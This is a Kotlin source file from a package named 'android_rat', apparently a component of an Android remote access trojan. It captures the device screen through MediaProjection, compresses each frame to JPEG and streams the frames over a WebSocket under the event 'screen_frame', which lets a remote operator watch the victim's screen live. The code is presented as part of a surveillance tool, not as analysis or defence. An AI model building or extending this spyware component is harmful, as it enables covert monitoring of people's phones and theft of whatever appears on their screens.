package com.example.android_rat.utils

import android.content.Context
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.ImageFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.os.Handler
import android.os.HandlerThread
import android.util.Log
import android.util.Size
import java.io.ByteArrayOutputStream

class ScreenStreamer(
    private val context: Context,
    private val mediaProjection: MediaProjection,
    private val screenSize: Size = Size(320, 240)  // Low resolution for efficiency
) {
    private var imageReader: ImageReader? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var udpThread: HandlerThread? = null
    private var backgroundHandler: Handler? = null

    fun startStreaming() {
        startBackgroundThread()

        // Create ImageReader to capture screen
        if (imageReader == null) {
            imageReader = ImageReader.newInstance(
                screenSize.width, screenSize.height, ImageFormat.JPEG, 2
            ).apply {
                setOnImageAvailableListener({ reader ->
                    processImage(reader.acquireLatestImage())
                }, backgroundHandler)
            }
        }

        // Start VirtualDisplay to capture the screen
        virtualDisplay = mediaProjection.createVirtualDisplay(
            "ScreenCapture",
            screenSize.width,
            screenSize.height,
            context.resources.displayMetrics.densityDpi,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            imageReader?.surface,
            null,
            backgroundHandler
        )
    }

    fun stopStreaming() {
        virtualDisplay?.release()
        imageReader?.close()
        udpThread?.quitSafely()
        udpThread = null
        backgroundHandler = null
    }

    private fun startBackgroundThread() {
        if (udpThread == null) {
            udpThread = HandlerThread("ScreenStreamerUDPThread").apply {
                start()
                backgroundHandler = Handler(looper)
            }
        } else {
            Log.d("ScreenStreamer", "Background thread is already running")
        }
    }

    private fun processImage(image: android.media.Image?) {
        image?.use {
            val buffer = it.planes[0].buffer
            val bytes = ByteArray(buffer.remaining())
            buffer.get(bytes)

            // Adjust compression quality
            val compressedBytes = compressJPEG(bytes, quality = 50)

            // Send the compressed image over WebSocket or UDP
            sendFrameDataOverWebSocket(compressedBytes)

            // Release the image memory
            image.close()
        }
    }

    private fun compressJPEG(inputBytes: ByteArray, quality: Int): ByteArray {
        val bitmap = BitmapFactory.decodeByteArray(inputBytes, 0, inputBytes.size)
        val outputStream = ByteArrayOutputStream()

        // Compress the JPEG to lower quality
        bitmap.compress(Bitmap.CompressFormat.JPEG, quality, outputStream)

        return outputStream.toByteArray()
    }

    private fun sendFrameDataOverWebSocket(data: ByteArray) {
        Thread {
            try {
                // Send the data through WebSocket
                WebSocketUtils.emitBytes("screen_frame", data)
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }.start()
    }
}
